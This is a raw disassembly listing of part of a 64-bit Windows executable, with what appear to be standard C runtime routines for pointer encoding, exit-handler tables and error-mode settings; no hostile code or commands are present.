   140005d0a:	74 29                	je     0x140005d35
   140005d0c:	48 8d 15 c5 a7 00 00 	lea    0xa7c5(%rip),%rdx        # 0x1400104d8
   140005d13:	ff 15 cf 93 00 00    	call   *0x93cf(%rip)        # 0x14000f0e8
   140005d19:	48 85 c0             	test   %rax,%rax
   140005d1c:	74 12                	je     0x140005d30
   140005d1e:	49 ba 70 7b 5a 5e 9b 	movabs $0xa201879b5e5a7b70,%r10
   140005d25:	87 01 a2 
   140005d28:	8b cb                	mov    %ebx,%ecx
   140005d2a:	ff 15 38 95 00 00    	call   *0x9538(%rip)        # 0x14000f268
   140005d30:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140005d35:	48 85 c9             	test   %rcx,%rcx
   140005d38:	74 07                	je     0x140005d41
   140005d3a:	ff 15 a0 93 00 00    	call   *0x93a0(%rip)        # 0x14000f0e0
   140005d40:	90                   	nop
   140005d41:	48 83 c4 30          	add    $0x30,%rsp
   140005d45:	5b                   	pop    %rbx
   140005d46:	c3                   	ret
   140005d47:	cc                   	int3
   140005d48:	48 89 0d a9 41 01 00 	mov    %rcx,0x141a9(%rip)        # 0x140019ef8
   140005d4f:	c3                   	ret
   140005d50:	ba 02 00 00 00       	mov    $0x2,%edx
   140005d55:	33 c9                	xor    %ecx,%ecx
   140005d57:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   140005d5b:	e9 4c fe ff ff       	jmp    0x140005bac
   140005d60:	33 d2                	xor    %edx,%edx
   140005d62:	33 c9                	xor    %ecx,%ecx
   140005d64:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140005d68:	e9 3f fe ff ff       	jmp    0x140005bac
   140005d6d:	cc                   	int3
   140005d6e:	cc                   	int3
   140005d6f:	cc                   	int3
   140005d70:	45 33 c0             	xor    %r8d,%r8d
   140005d73:	41 8d 50 02          	lea    0x2(%r8),%edx
   140005d77:	e9 30 fe ff ff       	jmp    0x140005bac
   140005d7c:	48 83 ec 28          	sub    $0x28,%rsp
   140005d80:	4c 8b 05 b9 32 01 00 	mov    0x132b9(%rip),%r8        # 0x140019040
   140005d87:	48 8b d1             	mov    %rcx,%rdx
   140005d8a:	4c 39 05 67 41 01 00 	cmp    %r8,0x14167(%rip)        # 0x140019ef8
   140005d91:	75 21                	jne    0x140005db4
   140005d93:	41 8b c8             	mov    %r8d,%ecx
   140005d96:	b8 40 00 00 00       	mov    $0x40,%eax
   140005d9b:	83 e1 3f             	and    $0x3f,%ecx
   140005d9e:	2b c1                	sub    %ecx,%eax
   140005da0:	8a c8                	mov    %al,%cl
   140005da2:	48 d3 ca             	ror    %cl,%rdx
   140005da5:	49 33 d0             	xor    %r8,%rdx
   140005da8:	48 89 15 49 41 01 00 	mov    %rdx,0x14149(%rip)        # 0x140019ef8
   140005daf:	48 83 c4 28          	add    $0x28,%rsp
   140005db3:	c3                   	ret
   140005db4:	e8 27 07 00 00       	call   0x1400064e0
   140005db9:	cc                   	int3
   140005dba:	cc                   	int3
   140005dbb:	cc                   	int3
   140005dbc:	45 33 c0             	xor    %r8d,%r8d
   140005dbf:	33 d2                	xor    %edx,%edx
   140005dc1:	e9 e6 fd ff ff       	jmp    0x140005bac
   140005dc6:	cc                   	int3
   140005dc7:	cc                   	int3
   140005dc8:	48 83 ec 28          	sub    $0x28,%rsp
   140005dcc:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   140005dd2:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140005dd7:	75 12                	jne    0x140005deb
   140005dd9:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   140005ddf:	74 0a                	je     0x140005deb
   140005de1:	87 0d ed 43 01 00    	xchg   %ecx,0x143ed(%rip)        # 0x14001a1d4
   140005de7:	33 c0                	xor    %eax,%eax
   140005de9:	eb 15                	jmp    0x140005e00
   140005deb:	e8 64 16 00 00       	call   0x140007454
   140005df0:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005df6:	e8 01 14 00 00       	call   0x1400071fc
   140005dfb:	b8 16 00 00 00       	mov    $0x16,%eax
   140005e00:	48 83 c4 28          	add    $0x28,%rsp
   140005e04:	c3                   	ret
   140005e05:	cc                   	int3
   140005e06:	cc                   	int3
   140005e07:	cc                   	int3
   140005e08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e0d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005e12:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005e17:	57                   	push   %rdi
   140005e18:	48 83 ec 30          	sub    $0x30,%rsp
   140005e1c:	49 8b f9             	mov    %r9,%rdi
   140005e1f:	8b 0a                	mov    (%rdx),%ecx
   140005e21:	e8 82 2a 00 00       	call   0x1400088a8
   140005e26:	90                   	nop
   140005e27:	48 8d 1d ba 47 01 00 	lea    0x147ba(%rip),%rbx        # 0x14001a5e8
   140005e2e:	48 8d 35 cb 37 01 00 	lea    0x137cb(%rip),%rsi        # 0x140019600
   140005e35:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005e3a:	48 8d 05 af 47 01 00 	lea    0x147af(%rip),%rax        # 0x14001a5f0
   140005e41:	48 3b d8             	cmp    %rax,%rbx
   140005e44:	74 19                	je     0x140005e5f
   140005e46:	48 39 33             	cmp    %rsi,(%rbx)
   140005e49:	74 0e                	je     0x140005e59
   140005e4b:	48 8b d6             	mov    %rsi,%rdx
   140005e4e:	48 8b cb             	mov    %rbx,%rcx
   140005e51:	e8 3a 39 00 00       	call   0x140009790
   140005e56:	48 89 03             	mov    %rax,(%rbx)
   140005e59:	48 83 c3 08          	add    $0x8,%rbx
   140005e5d:	eb d6                	jmp    0x140005e35
   140005e5f:	8b 0f                	mov    (%rdi),%ecx
   140005e61:	e8 96 2a 00 00       	call   0x1400088fc
   140005e66:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005e6b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005e70:	48 83 c4 30          	add    $0x30,%rsp
   140005e74:	5f                   	pop    %rdi
   140005e75:	c3                   	ret
   140005e76:	cc                   	int3
   140005e77:	cc                   	int3
   140005e78:	b8 01 00 00 00       	mov    $0x1,%eax
   140005e7d:	87 05 81 40 01 00    	xchg   %eax,0x14081(%rip)        # 0x140019f04
   140005e83:	c3                   	ret
   140005e84:	4c 8b dc             	mov    %rsp,%r11
   140005e87:	48 83 ec 28          	sub    $0x28,%rsp
   140005e8b:	b8 04 00 00 00       	mov    $0x4,%eax
   140005e90:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140005e94:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140005e98:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005e9c:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140005ea0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140005ea4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140005ea8:	e8 5b ff ff ff       	call   0x140005e08
   140005ead:	48 83 c4 28          	add    $0x28,%rsp
   140005eb1:	c3                   	ret
   140005eb2:	cc                   	int3
   140005eb3:	cc                   	int3
   140005eb4:	40 53                	rex push %rbx
   140005eb6:	48 83 ec 20          	sub    $0x20,%rsp
   140005eba:	8b d9                	mov    %ecx,%ebx
   140005ebc:	e8 53 0c 00 00       	call   0x140006b14
   140005ec1:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140005ec8:	41 8b d0             	mov    %r8d,%edx
   140005ecb:	80 e2 02             	and    $0x2,%dl
   140005ece:	f6 da                	neg    %dl
   140005ed0:	1b c9                	sbb    %ecx,%ecx
   140005ed2:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005ed5:	74 36                	je     0x140005f0d
   140005ed7:	85 db                	test   %ebx,%ebx
   140005ed9:	74 39                	je     0x140005f14
   140005edb:	83 fb 01             	cmp    $0x1,%ebx
   140005ede:	74 20                	je     0x140005f00
   140005ee0:	83 fb 02             	cmp    $0x2,%ebx
   140005ee3:	74 15                	je     0x140005efa
   140005ee5:	e8 6a 15 00 00       	call   0x140007454
   140005eea:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005ef0:	e8 07 13 00 00       	call   0x1400071fc
   140005ef5:	83 c8 ff             	or     $0xffffffff,%eax
   140005ef8:	eb 1d                	jmp    0x140005f17
   140005efa:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   140005efe:	eb 04                	jmp    0x140005f04
   140005f00:	41 83 c8 02          	or     $0x2,%r8d
   140005f04:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   140005f0b:	eb 07                	jmp    0x140005f14
   140005f0d:	83 0d fc 38 01 00 ff 	orl    $0xffffffff,0x138fc(%rip)        # 0x140019810
   140005f14:	8d 41 02             	lea    0x2(%rcx),%eax
   140005f17:	48 83 c4 20          	add    $0x20,%rsp
   140005f1b:	5b                   	pop    %rbx
   140005f1c:	c3                   	ret
   140005f1d:	cc                   	int3
   140005f1e:	cc                   	int3
   140005f1f:	cc                   	int3
   140005f20:	8b 05 e2 3f 01 00    	mov    0x13fe2(%rip),%eax        # 0x140019f08
   140005f26:	c3                   	ret
   140005f27:	cc                   	int3
   140005f28:	48 83 ec 28          	sub    $0x28,%rsp
   140005f2c:	83 f9 01             	cmp    $0x1,%ecx
   140005f2f:	76 15                	jbe    0x140005f46
   140005f31:	e8 1e 15 00 00       	call   0x140007454
   140005f36:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005f3c:	e8 bb 12 00 00       	call   0x1400071fc
   140005f41:	83 c8 ff             	or     $0xffffffff,%eax
   140005f44:	eb 08                	jmp    0x140005f4e
   140005f46:	87 0d bc 3f 01 00    	xchg   %ecx,0x13fbc(%rip)        # 0x140019f08
   140005f4c:	8b c1                	mov    %ecx,%eax
   140005f4e:	48 83 c4 28          	add    $0x28,%rsp
   140005f52:	c3                   	ret
   140005f53:	cc                   	int3
   140005f54:	48 8d 05 b1 3f 01 00 	lea    0x13fb1(%rip),%rax        # 0x140019f0c
   140005f5b:	c3                   	ret
   140005f5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f61:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005f66:	57                   	push   %rdi
   140005f67:	48 83 ec 20          	sub    $0x20,%rsp
   140005f6b:	49 8b d9             	mov    %r9,%rbx
   140005f6e:	49 8b f8             	mov    %r8,%rdi
   140005f71:	8b 0a                	mov    (%rdx),%ecx
   140005f73:	e8 30 29 00 00       	call   0x1400088a8
   140005f78:	90                   	nop
   140005f79:	48 8b cf             	mov    %rdi,%rcx
   140005f7c:	e8 53 00 00 00       	call   0x140005fd4
   140005f81:	8b f8                	mov    %eax,%edi
   140005f83:	8b 0b                	mov    (%rbx),%ecx
   140005f85:	e8 72 29 00 00       	call   0x1400088fc
   140005f8a:	8b c7                	mov    %edi,%eax
   140005f8c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f91:	48 83 c4 20          	add    $0x20,%rsp
   140005f95:	5f                   	pop    %rdi
   140005f96:	c3                   	ret
   140005f97:	cc                   	int3
   140005f98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f9d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005fa2:	57                   	push   %rdi
   140005fa3:	48 83 ec 20          	sub    $0x20,%rsp
   140005fa7:	49 8b d9             	mov    %r9,%rbx
   140005faa:	49 8b f8             	mov    %r8,%rdi
   140005fad:	8b 0a                	mov    (%rdx),%ecx
   140005faf:	e8 f4 28 00 00       	call   0x1400088a8
   140005fb4:	90                   	nop
   140005fb5:	48 8b cf             	mov    %rdi,%rcx
   140005fb8:	e8 c7 01 00 00       	call   0x140006184
   140005fbd:	8b f8                	mov    %eax,%edi
   140005fbf:	8b 0b                	mov    (%rbx),%ecx
   140005fc1:	e8 36 29 00 00       	call   0x1400088fc
   140005fc6:	8b c7                	mov    %edi,%eax
   140005fc8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005fcd:	48 83 c4 20          	add    $0x20,%rsp
   140005fd1:	5f                   	pop    %rdi
   140005fd2:	c3                   	ret
   140005fd3:	cc                   	int3
   140005fd4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005fd9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140005fde:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005fe3:	57                   	push   %rdi
   140005fe4:	41 56                	push   %r14
   140005fe6:	41 57                	push   %r15
   140005fe8:	48 83 ec 20          	sub    $0x20,%rsp
   140005fec:	48 8b 01             	mov    (%rcx),%rax
   140005fef:	33 ed                	xor    %ebp,%ebp
   140005ff1:	4c 8b f9             	mov    %rcx,%r15
   140005ff4:	48 8b 18             	mov    (%rax),%rbx
   140005ff7:	48 85 db             	test   %rbx,%rbx
   140005ffa:	0f 84 68 01 00 00    	je     0x140006168
   140006000:	4c 8b 15 39 30 01 00 	mov    0x13039(%rip),%r10        # 0x140019040
   140006007:	48 8b 33             	mov    (%rbx),%rsi
   14000600a:	41 8b ca             	mov    %r10d,%ecx
   14000600d:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140006011:	83 e1 3f             	and    $0x3f,%ecx
   140006014:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140006018:	49 33 f2             	xor    %r10,%rsi
   14000601b:	4d 33 ca             	xor    %r10,%r9
   14000601e:	48 d3 ce             	ror    %cl,%rsi
   140006021:	49 33 da             	xor    %r10,%rbx
   140006024:	49 d3 c9             	ror    %cl,%r9
   140006027:	48 d3 cb             	ror    %cl,%rbx
   14000602a:	4c 3b cb             	cmp    %rbx,%r9
   14000602d:	0f 85 a7 00 00 00    	jne    0x1400060da
   140006033:	48 2b de             	sub    %rsi,%rbx
   140006036:	b8 00 02 00 00       	mov    $0x200,%eax
   14000603b:	48 c1 fb 03          	sar    $0x3,%rbx
   14000603f:	48 3b d8             	cmp    %rax,%rbx
   140006042:	48 8b fb             	mov    %rbx,%rdi
   140006045:	48 0f 47 f8          	cmova  %rax,%rdi
   140006049:	8d 45 20             	lea    0x20(%rbp),%eax
   14000604c:	48 03 fb             	add    %rbx,%rdi
   14000604f:	48 0f 44 f8          	cmove  %rax,%rdi
   140006053:	48 3b fb             	cmp    %rbx,%rdi
   140006056:	72 1e                	jb     0x140006076
   140006058:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   14000605c:	48 8b d7             	mov    %rdi,%rdx
   14000605f:	48 8b ce             	mov    %rsi,%rcx
   140006062:	e8 fd 3b 00 00       	call   0x140009c64
   140006067:	33 c9                	xor    %ecx,%ecx
   140006069:	4c 8b f0             	mov    %rax,%r14
   14000606c:	e8 7b 14 00 00       	call   0x1400074ec
   140006071:	4d 85 f6             	test   %r14,%r14
   140006074:	75 28                	jne    0x14000609e
   140006076:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   14000607a:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140006080:	48 8b d7             	mov    %rdi,%rdx
   140006083:	48 8b ce             	mov    %rsi,%rcx
   140006086:	e8 d9 3b 00 00       	call   0x140009c64
   14000608b:	33 c9                	xor    %ecx,%ecx
   14000608d:	4c 8b f0             	mov    %rax,%r14
   140006090:	e8 57 14 00 00       	call   0x1400074ec
   140006095:	4d 85 f6             	test   %r14,%r14
   140006098:	0f 84 ca 00 00 00    	je     0x140006168
   14000609e:	4c 8b 15 9b 2f 01 00 	mov    0x12f9b(%rip),%r10        # 0x140019040
   1400060a5:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   1400060a9:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   1400060ad:	49 8b f6             	mov    %r14,%rsi
   1400060b0:	48 8b cb             	mov    %rbx,%rcx
   1400060b3:	49 2b c9             	sub    %r9,%rcx
   1400060b6:	48 83 c1 07          	add    $0x7,%rcx
   1400060ba:	48 c1 e9 03          	shr    $0x3,%rcx
   1400060be:	4c 3b cb             	cmp    %rbx,%r9
   1400060c1:	48 0f 47 cd          	cmova  %rbp,%rcx
   1400060c5:	48 85 c9             	test   %rcx,%rcx
   1400060c8:	74 10                	je     0x1400060da
   1400060ca:	49 8b c2             	mov    %r10,%rax
   1400060cd:	49 8b f9             	mov    %r9,%rdi
   1400060d0:	f3 48 ab             	rep stos %rax,(%rdi)
   1400060d3:	4c 8b 15 66 2f 01 00 	mov    0x12f66(%rip),%r10        # 0x140019040
   1400060da:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1400060e0:	49 8d 79 08          	lea    0x8(%r9),%rdi
   1400060e4:	41 8b c8             	mov    %r8d,%ecx
   1400060e7:	41 8b c2             	mov    %r10d,%eax
   1400060ea:	83 e0 3f             	and    $0x3f,%eax
   1400060ed:	2b c8                	sub    %eax,%ecx
   1400060ef:	49 8b 47 08          	mov    0x8(%r15),%rax
   1400060f3:	48 8b 10             	mov    (%rax),%rdx
   1400060f6:	41 8b c0             	mov    %r8d,%eax
   1400060f9:	48 d3 ca             	ror    %cl,%rdx
   1400060fc:	49 33 d2             	xor    %r10,%rdx
   1400060ff:	49 89 11             	mov    %rdx,(%r9)
   140006102:	48 8b 15 37 2f 01 00 	mov    0x12f37(%rip),%rdx        # 0x140019040
   140006109:	8b ca                	mov    %edx,%ecx
   14000610b:	83 e1 3f             	and    $0x3f,%ecx
   14000610e:	2b c1                	sub    %ecx,%eax
   140006110:	8a c8                	mov    %al,%cl
   140006112:	49 8b 07             	mov    (%r15),%rax
   140006115:	48 d3 ce             	ror    %cl,%rsi
   140006118:	48 33 f2             	xor    %rdx,%rsi
   14000611b:	48 8b 08             	mov    (%rax),%rcx
   14000611e:	48 89 31             	mov    %rsi,(%rcx)
   140006121:	41 8b c8             	mov    %r8d,%ecx
   140006124:	48 8b 15 15 2f 01 00 	mov    0x12f15(%rip),%rdx        # 0x140019040
   14000612b:	8b c2                	mov    %edx,%eax
   14000612d:	83 e0 3f             	and    $0x3f,%eax
   140006130:	2b c8                	sub    %eax,%ecx
   140006132:	49 8b 07             	mov    (%r15),%rax
   140006135:	48 d3 cf             	ror    %cl,%rdi
   140006138:	48 33 fa             	xor    %rdx,%rdi
   14000613b:	48 8b 10             	mov    (%rax),%rdx
   14000613e:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140006142:	48 8b 15 f7 2e 01 00 	mov    0x12ef7(%rip),%rdx        # 0x140019040
   140006149:	8b c2                	mov    %edx,%eax
   14000614b:	83 e0 3f             	and    $0x3f,%eax
   14000614e:	44 2b c0             	sub    %eax,%r8d
   140006151:	49 8b 07             	mov    (%r15),%rax
   140006154:	41 8a c8             	mov    %r8b,%cl
   140006157:	48 d3 cb             	ror    %cl,%rbx
   14000615a:	48 33 da             	xor    %rdx,%rbx
   14000615d:	48 8b 08             	mov    (%rax),%rcx
   140006160:	33 c0                	xor    %eax,%eax
   140006162:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140006166:	eb 03                	jmp    0x14000616b
   140006168:	83 c8 ff             	or     $0xffffffff,%eax
   14000616b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140006170:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140006175:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000617a:	48 83 c4 20          	add    $0x20,%rsp
   14000617e:	41 5f                	pop    %r15
   140006180:	41 5e                	pop    %r14
   140006182:	5f                   	pop    %rdi
   140006183:	c3                   	ret
   140006184:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006189:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000618e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006193:	57                   	push   %rdi
   140006194:	41 56                	push   %r14
   140006196:	41 57                	push   %r15
   140006198:	48 83 ec 20          	sub    $0x20,%rsp
   14000619c:	48 8b 01             	mov    (%rcx),%rax
   14000619f:	48 8b f1             	mov    %rcx,%rsi
   1400061a2:	48 8b 18             	mov    (%rax),%rbx
   1400061a5:	48 85 db             	test   %rbx,%rbx
   1400061a8:	75 08                	jne    0x1400061b2
   1400061aa:	83 c8 ff             	or     $0xffffffff,%eax
   1400061ad:	e9 d9 00 00 00       	jmp    0x14000628b
   1400061b2:	48 8b 3b             	mov    (%rbx),%rdi
   1400061b5:	4c 8b 05 84 2e 01 00 	mov    0x12e84(%rip),%r8        # 0x140019040
   1400061bc:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   1400061c0:	49 33 f8             	xor    %r8,%rdi
   1400061c3:	49 33 d8             	xor    %r8,%rbx
   1400061c6:	41 8b c8             	mov    %r8d,%ecx
   1400061c9:	83 e1 3f             	and    $0x3f,%ecx
   1400061cc:	48 d3 cf             	ror    %cl,%rdi
   1400061cf:	48 d3 cb             	ror    %cl,%rbx
   1400061d2:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   1400061d6:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   1400061da:	0f 87 a9 00 00 00    	ja     0x140006289
   1400061e0:	41 8b c8             	mov    %r8d,%ecx
   1400061e3:	4d 8b f0             	mov    %r8,%r14
   1400061e6:	83 e1 3f             	and    $0x3f,%ecx
   1400061e9:	4c 8b ff             	mov    %rdi,%r15
   1400061ec:	48 8b eb             	mov    %rbx,%rbp
   1400061ef:	48 83 eb 08          	sub    $0x8,%rbx
   1400061f3:	48 3b df             	cmp    %rdi,%rbx
   1400061f6:	72 5f                	jb     0x140006257
   1400061f8:	48 8b 03             	mov    (%rbx),%rax
   1400061fb:	49 3b c6             	cmp    %r14,%rax
   1400061fe:	74 ef                	je     0x1400061ef
   140006200:	49 33 c0             	xor    %r8,%rax
   140006203:	4c 89 33             	mov    %r14,(%rbx)
   140006206:	48 d3 c8             	ror    %cl,%rax
   140006209:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140006210:	3e f1 85 
   140006213:	ff 15 4f 90 00 00    	call   *0x904f(%rip)        # 0x14000f268
   140006219:	4c 8b 05 20 2e 01 00 	mov    0x12e20(%rip),%r8        # 0x140019040
   140006220:	48 8b 06             	mov    (%rsi),%rax
   140006223:	41 8b c8             	mov    %r8d,%ecx
   140006226:	83 e1 3f             	and    $0x3f,%ecx
   140006229:	48 8b 10             	mov    (%rax),%rdx
   14000622c:	4c 8b 0a             	mov    (%rdx),%r9
   14000622f:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140006233:	4d 33 c8             	xor    %r8,%r9
   140006236:	49 33 c0             	xor    %r8,%rax
   140006239:	49 d3 c9             	ror    %cl,%r9
   14000623c:	48 d3 c8             	ror    %cl,%rax
   14000623f:	4d 3b cf             	cmp    %r15,%r9
   140006242:	75 05                	jne    0x140006249
   140006244:	48 3b c5             	cmp    %rbp,%rax
   140006247:	74 a6                	je     0x1400061ef
   140006249:	4d 8b f9             	mov    %r9,%r15
   14000624c:	49 8b f9             	mov    %r9,%rdi
   14000624f:	48 8b e8             	mov    %rax,%rbp
   140006252:	48 8b d8             	mov    %rax,%rbx
   140006255:	eb 98                	jmp    0x1400061ef
   140006257:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000625b:	74 0f                	je     0x14000626c
   14000625d:	48 8b cf             	mov    %rdi,%rcx
   140006260:	e8 87 12 00 00       	call   0x1400074ec
   140006265:	4c 8b 05 d4 2d 01 00 	mov    0x12dd4(%rip),%r8        # 0x140019040
   14000626c:	48 8b 06             	mov    (%rsi),%rax
   14000626f:	48 8b 08             	mov    (%rax),%rcx
   140006272:	4c 89 01             	mov    %r8,(%rcx)
   140006275:	48 8b 06             	mov    (%rsi),%rax
   140006278:	48 8b 08             	mov    (%rax),%rcx
   14000627b:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   14000627f:	48 8b 06             	mov    (%rsi),%rax
   140006282:	48 8b 08             	mov    (%rax),%rcx
   140006285:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140006289:	33 c0                	xor    %eax,%eax
   14000628b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006290:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006295:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000629a:	48 83 c4 20          	add    $0x20,%rsp
   14000629e:	41 5f                	pop    %r15
   1400062a0:	41 5e                	pop    %r14
   1400062a2:	5f                   	pop    %rdi
   1400062a3:	c3                   	ret
   1400062a4:	48 8b d1             	mov    %rcx,%rdx
   1400062a7:	48 8d 0d 62 3c 01 00 	lea    0x13c62(%rip),%rcx        # 0x140019f10
   1400062ae:	e9 6d 00 00 00       	jmp    0x140006320
   1400062b3:	cc                   	int3
   1400062b4:	4c 8b dc             	mov    %rsp,%r11
   1400062b7:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1400062bb:	48 83 ec 38          	sub    $0x38,%rsp
   1400062bf:	49 c7 43 f0 fe ff ff 	movq   $0xfffffffffffffffe,-0x10(%r11)
   1400062c6:	ff 
   1400062c7:	49 8d 43 08          	lea    0x8(%r11),%rax
   1400062cb:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   1400062cf:	b8 02 00 00 00       	mov    $0x2,%eax
   1400062d4:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400062d8:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400062dc:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   1400062e0:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   1400062e4:	49 8d 53 20          	lea    0x20(%r11),%rdx
   1400062e8:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   1400062ec:	e8 a7 fc ff ff       	call   0x140005f98
   1400062f1:	90                   	nop
   1400062f2:	48 83 c4 38          	add    $0x38,%rsp
   1400062f6:	c3                   	ret
   1400062f7:	cc                   	int3
   1400062f8:	48 85 c9             	test   %rcx,%rcx
   1400062fb:	75 04                	jne    0x140006301
   1400062fd:	83 c8 ff             	or     $0xffffffff,%eax
   140006300:	c3                   	ret
   140006301:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140006305:	48 39 01             	cmp    %rax,(%rcx)
   140006308:	75 12                	jne    0x14000631c
   14000630a:	48 8b 05 2f 2d 01 00 	mov    0x12d2f(%rip),%rax        # 0x140019040
   140006311:	48 89 01             	mov    %rax,(%rcx)
   140006314:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140006318:	48 89 41 10          	mov    %rax,0x10(%rcx)
   14000631c:	33 c0                	xor    %eax,%eax
   14000631e:	c3                   	ret
   14000631f:	cc                   	int3
   140006320:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140006325:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000632a:	55                   	push   %rbp
   14000632b:	48 8b ec             	mov    %rsp,%rbp
   14000632e:	48 83 ec 40          	sub    $0x40,%rsp
   140006332:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140006336:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000633a:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   14000633e:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140006342:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006346:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000634a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000634f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140006353:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140006357:	89 45 28             	mov    %eax,0x28(%rbp)
   14000635a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000635d:	e8 fa fb ff ff       	call   0x140005f5c
   140006362:	48 83 c4 40          	add    $0x40,%rsp
   140006366:	5d                   	pop    %rbp
   140006367:	c3                   	ret
   140006368:	48 83 ec 28          	sub    $0x28,%rsp
   14000636c:	48 8b 0d 55 44 01 00 	mov    0x14455(%rip),%rcx        # 0x14001a7c8
   140006373:	e8 74 11 00 00       	call   0x1400074ec
   140006378:	48 8b 0d 51 44 01 00 	mov    0x14451(%rip),%rcx        # 0x14001a7d0
   14000637f:	48 83 25 41 44 01 00 	andq   $0x0,0x14441(%rip)        # 0x14001a7c8
   140006386:	00 
   140006387:	e8 60 11 00 00       	call   0x1400074ec
   14000638c:	48 8b 0d e5 3b 01 00 	mov    0x13be5(%rip),%rcx        # 0x140019f78
   140006393:	48 83 25 35 44 01 00 	andq   $0x0,0x14435(%rip)        # 0x14001a7d0
   14000639a:	00 
   14000639b:	e8 4c 11 00 00       	call   0x1400074ec
   1400063a0:	48 8b 0d d9 3b 01 00 	mov    0x13bd9(%rip),%rcx        # 0x140019f80
   1400063a7:	48 83 25 c9 3b 01 00 	andq   $0x0,0x13bc9(%rip)        # 0x140019f78
   1400063ae:	00 
   1400063af:	e8 38 11 00 00       	call   0x1400074ec
   1400063b4:	48 83 25 c4 3b 01 00 	andq   $0x0,0x13bc4(%rip)        # 0x140019f80
   1400063bb:	00 
   1400063bc:	b0 01                	mov    $0x1,%al
   1400063be:	48 83 c4 28          	add    $0x28,%rsp
   1400063c2:	c3                   	ret
   1400063c3:	cc                   	int3
   1400063c4:	48 8d 05 35 32 01 00 	lea    0x13235(%rip),%rax        # 0x140019600
   1400063cb:	48 89 05 16 42 01 00 	mov    %rax,0x14216(%rip)        # 0x14001a5e8
   1400063d2:	b0 01                	mov    $0x1,%al
   1400063d4:	c3                   	ret
   1400063d5:	cc                   	int3
   1400063d6:	cc                   	int3
   1400063d7:	cc                   	int3
   1400063d8:	48 83 ec 28          	sub    $0x28,%rsp
   1400063dc:	48 8d 0d 2d 3b 01 00 	lea    0x13b2d(%rip),%rcx        # 0x140019f10
   1400063e3:	e8 10 ff ff ff       	call   0x1400062f8
